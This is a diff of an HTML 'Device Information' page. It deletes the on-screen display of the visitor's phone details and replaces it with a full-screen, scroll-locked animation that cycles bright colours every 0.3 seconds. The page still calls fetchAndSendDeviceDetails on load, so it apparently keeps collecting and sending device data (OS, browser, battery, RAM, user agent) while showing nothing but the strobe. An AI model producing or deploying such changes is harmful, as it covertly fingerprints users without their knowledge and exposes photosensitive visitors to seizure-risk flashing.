@@ -5,39 +5,29 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Device Information</title>
     <style>
-        .info-box {
-            margin: 20px;
-            padding: 20px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            font-family: Arial, sans-serif;
-            background-color: #f9f9f9;
+        body {
+            margin: 0;
+            overflow: hidden; /* Hide scrollbars */
+        }
+        .flicker {
+            width: 100vw;
+            height: 100vh;
+            animation: flicker 0.3s infinite;
+            position: absolute;
         }
         /* Screen flicker effect */
         @keyframes flicker {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.1; }
-        }
-        .flicker {
-            animation: flicker 0.3s infinite;
+            0% { background-color: red; }
+            20% { background-color: blue; }
+            40% { background-color: green; }
+            60% { background-color: yellow; }
+            80% { background-color: red; }
+            100% { background-color: blue; }
         }
     </style>
 </head>
 <body>
-    <div class="info-box flicker">
-        <h2>Your Phone Details:</h2>
-        <p><strong>Device Type:</strong> <span id="deviceType"></span></p>
-        <p><strong>Operating System:</strong> <span id="os"></span></p>
-        <p><strong>OS Version:</strong> <span id="osVersion"></span></p>
-        <p><strong>Browser:</strong> <span id="browser"></span></p>
-        <p><strong>Browser Version:</strong> <span id="browserVersion"></span></p>
-        <p><strong>Screen Resolution:</strong> <span id="resolution"></span></p>
-        <p><strong>Language:</strong> <span id="language"></span></p>
-        <p><strong>User Agent:</strong> <span id="userAgent"></span></p>
-        <p><strong>Battery Level:</strong> <span id="batteryLevel"></span></p>
-        <p><strong>Device RAM:</strong> <span id="storageCapacity"></span></p>
-        <p><strong>Number of Logical Processors:</strong> <span id="logicalProcessors"></span></p>
-    </div>
+    <div class="flicker"></div>
 
     <script>
         // Device Type
@@ -80,22 +70,11 @@
         function getBrowser() {
             const userAgent = navigator.userAgent.toLowerCase();
 
-            // Detect Microsoft Edge (Chromium-based)
             if (userAgent.includes('edg')) return 'Microsoft Edge';
-
-            // Detect Samsung Internet Browser
             if (userAgent.includes('samsungbrowser')) return 'Samsung Internet';
-
-            // Detect Mozilla Firefox
             if (userAgent.includes('firefox')) return 'Mozilla Firefox';
-
-            // Detect Safari (Make sure it's not Chrome since Safari's user agent contains "Safari" too)
             if (userAgent.includes('safari') && !userAgent.includes('chrome') && !userAgent.includes('android')) return 'Safari';
-
-            // Detect Chrome
             if (userAgent.includes('chrome') && !userAgent.includes('edg') && !userAgent.includes('samsungbrowser')) return 'Google Chrome';
-
-            // Detect Internet Explorer (legacy)
             if (userAgent.includes('msie') || userAgent.includes('trident')) return 'Internet Explorer';
 
             return 'Unknown';
@@ -105,7 +84,6 @@
             const userAgent = navigator.userAgent;
             let match;
 
-            // Handle specific cases for Edge and Samsung Internet
             if (userAgent.includes('edg')) {
                 match = userAgent.match(/edg\/([0-9]+(?:\.[0-9]+)*(?:\.[0-9]+)?)/i);
             } else if (userAgent.includes('samsungbrowser')) {
@@ -202,21 +180,6 @@
         window.onload = function() {
             fetchAndSendDeviceDetails();
         };
-
-        // Set device info in the DOM
-        fetchDeviceDetails().then(details => {
-            document.getElementById('deviceType').textContent = details.deviceType;
-            document.getElementById('os').textContent = details.os;
-            document.getElementById('osVersion').textContent = details.osVersion;
-            document.getElementById('browser').textContent = details.browser;
-            document.getElementById('browserVersion').textContent = details.browserVersion;
-            document.getElementById('resolution').textContent = details.resolution;
-            document.getElementById('language').textContent = details.language;
-            document.getElementById('batteryLevel').textContent = details.batteryLevel;
-            document.getElementById('storageCapacity').textContent = details.storageCapacity;
-            document.getElementById('logicalProcessors').textContent = details.logicalProcessors;
-            document.getElementById('userAgent').textContent = navigator.userAgent;
-        });
     </script>
 </body>
 </html>
